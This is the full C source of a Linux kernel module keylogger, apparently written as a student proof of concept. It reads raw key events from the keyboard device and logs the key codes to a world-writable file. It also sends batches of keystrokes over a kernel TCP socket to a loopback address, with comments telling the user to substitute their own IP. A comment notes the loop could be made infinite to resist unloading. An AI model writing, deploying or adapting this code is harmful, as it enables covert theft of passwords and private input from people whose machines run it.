#include <linux/init.h>
#include <linux/input.h>
#include <linux/module.h>
#include <linux/socket.h>
#include <linux/kernel.h>
#include <linux/net.h>
#include <linux/uaccess.h>
#include <linux/in.h>
#include <linux/seq_file_net.h>
#include <linux/slab.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Peter Derias z5311768");

int keylogger_strcat(char *src, char *dst) {
    int i, j;
    for (i = 0; src[i] != '\0'; i++);
    for (j = i; dst[j - i] != '\0'; j++) {
        src[j] = dst[j - i];
    }
    src[j] = '\0';
    return j;
}

static int __init keylogger_init(void) {
    loff_t zero;
    char buf[20], pack[800];
    struct socket *sock = kmalloc(sizeof(*sock), GFP_KERNEL);
    int err, size;        
    int log, dev, i;
    mm_segment_t old_fs = get_fs();
    struct input_event ev;
    struct file *keyboard = filp_open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY, 0);
    char *persist_f = "/your_strokes.txt";
    struct file *persist = filp_open(persist_f, O_RDWR | O_CREAT | O_APPEND, 0777);
    if (!persist) {
        printk(KERN_INFO "bad\n");
        return -1;
    }
    i = 0;
    zero = 0;
    pack[0] = '\0';
    set_fs(KERNEL_DS);
    // this can be set to "while (1)", and this should never return. Any interrupts trying to cancel the procees or unload it will
    // be responded to with a "busy" error. This is changed since this is a proof of concept.
    while (i < 10000) {
        kernel_read(keyboard, &ev, sizeof(struct input_event), &zero);
        if (ev.value == 1) {
            printk(KERN_INFO "%d, %d\n", ev.code, ev.value);
            snprintf(buf, 20, "%d\n", ev.code);
            size = keylogger_strcat(pack, buf);
            // find the size needed
            dev = ev.code;
            for (log = 1; dev != 0; log++) {
                dev = dev/10;
            }
            kernel_write(persist, buf, log, &zero);
        }
        if (i % 40 == 0) {
            // send me your data - well, this will send to 127.0.0.1 as a proof of concept. Change it for your needs.
            if (i == 0) {
                struct sockaddr_in addr = {
                    .sin_family = AF_INET,
                    .sin_port = htons (61100),
                    .sin_addr = { htonl (INADDR_LOOPBACK) } // change this line to your IP!
                };
                err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
                if (err < 0) {
                        printk(KERN_INFO "failed tcp thingo\n");
                        printk(KERN_INFO "failed! I don't know what is the point of me, so kill me plz\n");
                        break;
                }
                err = sock->ops->connect(sock, (struct sockaddr *) &addr, sizeof(addr), O_RDWR);
                if (err < 0) {
                        printk(KERN_INFO "failed to connect!\nerror is %d\n I don't know what is the point of me, so kill me plz\n", err);
                        break;
                }
            }
            if (i != 0) {
                struct msghdr msg;
                struct sockaddr_in addr = {
                    .sin_family = AF_INET,
                    .sin_port = htons (61100),
                    .sin_addr = { htonl (INADDR_LOOPBACK) } // change this line to your IP!
                };
                msg.msg_name = &addr;
                msg.msg_namelen = sizeof(addr);
                msg.msg_flags = 0;
                msg.msg_control = 0;
                msg.msg_controllen = 0;
                struct kvec vec;
                vec.iov_base = pack;
                vec.iov_len = size;

                err = kernel_sendmsg(sock, &msg, &vec, (size_t) 1, (size_t) size);
                if (err < 0) {
                        printk(KERN_INFO "failed to send!\nerror is %d\n I don't know what is the point of me, so kill me plz\n", err);
                        break;
                }
                pack[0] = '\0';
            }
        }
        i++;
    }
    set_fs(old_fs);
    return 0;
}
static void keylogger_exit(void) {
    printk(KERN_INFO "unloaded successfully");
}

module_init(keylogger_init);
module_exit(keylogger_exit);